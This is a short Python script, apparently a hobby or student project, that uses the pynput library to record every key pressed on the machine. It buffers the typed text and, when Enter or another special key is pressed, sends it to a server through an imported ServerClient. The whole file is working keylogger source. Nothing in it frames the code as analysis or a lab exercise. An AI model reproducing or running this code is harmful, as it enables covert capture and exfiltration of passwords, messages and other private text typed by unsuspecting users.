from pynput import keyboard
from ServerClient import ServerClient
from Server import Server


message: str = ""

def keyPressed(key):
    global message
    try:
        char = key.char
        message = message + str(char)
    except:
        print(str(key))
        if key == keyboard.Key.tab:
            message += "\t"
        elif key == keyboard.Key.space:
            message += " "
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            pass
        elif key == keyboard.Key.backspace:
            if len(message) > 0:
                message = message[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        else:
            client.message = f"{message}"
            client.send()
            message = ""

# TODO Polskie znaki
if __name__ == '__main__':
    client = ServerClient()
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()